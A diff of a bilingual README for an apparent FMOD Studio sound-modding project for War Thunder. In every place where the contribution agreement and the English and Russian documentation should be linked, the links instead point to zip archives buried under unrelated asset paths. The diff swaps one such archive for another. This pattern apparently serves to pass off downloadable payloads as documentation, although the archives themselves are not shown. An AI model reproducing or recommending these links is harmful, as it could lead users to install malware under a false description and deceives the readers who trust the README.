@@ -1,6 +1,6 @@
 ## BY USING THIS CONTENT YOU AGREE TO THE FOLLOWING CONTRIBUTION AGREEMENT
 
-https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/tanks/engines/bradley/fmod-studio-modders-warthunder-for-3.9.zip
+https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/radio_chat/eng/voice2/modders-fmod-for-warthunder-studio-v2.7-beta.5.zip
 
 This repository contains the Fmod Studio project for War Thunder. This project allows you to create sound modifications. The project doesn’t include crew chat, other monologues, and music. To save space, assets are compressed into vorbis format in the .ogg container (extensions renamed to .wav to preserve the integrity of the original sound event). To keep the project work in the game you shouldn't change sound events names, and the structure of their location in the project.  Also, do not change the structure of the mixer buses.
 
@@ -11,7 +11,7 @@ In this repository we added compressed assets (with losses, ogg, vorbis) in orde
 
 ## ИСПОЛЬЗУЯ ДАННЫЕ МАТЕРИАЛЫ, ВЫ СОГЛАШАЕТЕСЬ СО СЛЕДУЮЩИМ СОГЛАШЕНИЕМ О ПРЕДОСТАВЛЕНИИ КОНТЕНТА
 
-https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/tanks/engines/bradley/fmod-studio-modders-warthunder-for-3.9.zip
+https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/radio_chat/eng/voice2/modders-fmod-for-warthunder-studio-v2.7-beta.5.zip
 
 Данный репозиторий содержит проект Fmod Studio для игры War Thunder. На его основе можно создавать звуковые модификации. В проект не включены реплики экипажей, прочие монологи, музыка. Ассеты, в целях экономии места, сжаты в формат vorbis в контейнере ogg (расширения переименованы в wav для сохранения целостности исходного звукового ивента). Для работоспособности проекта в игре не надо менять имена звуковых ивентов, и структуру их расположения в проекте. Так же не надо менять структуру шин микшера.
 
@@ -80,10 +80,10 @@ Update: Added German localisation for voice messages and commands.
 This update got the new automatic weapon sound system, and new automatic weapon sound events, for all in-game vehicles. In a nutshell, it is a kind of loop mode, but with an element of a granular synthesis. You can read about how you can switch the support of sound modification between old and new weapon sound systems here:
 
 EN:
-https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/tanks/engines/bradley/fmod-studio-modders-warthunder-for-3.9.zip
+https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/radio_chat/eng/voice2/modders-fmod-for-warthunder-studio-v2.7-beta.5.zip
 
 RU:
-https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/tanks/engines/bradley/fmod-studio-modders-warthunder-for-3.9.zip
+https://raw.githubusercontent.com/SIllowet/fmod_studio_warthunder_for_modders/master/Assets/radio_chat/eng/voice2/modders-fmod-for-warthunder-studio-v2.7-beta.5.zip
 
 -----------------------
 18.06.2021 - Red Skies fmod project update.
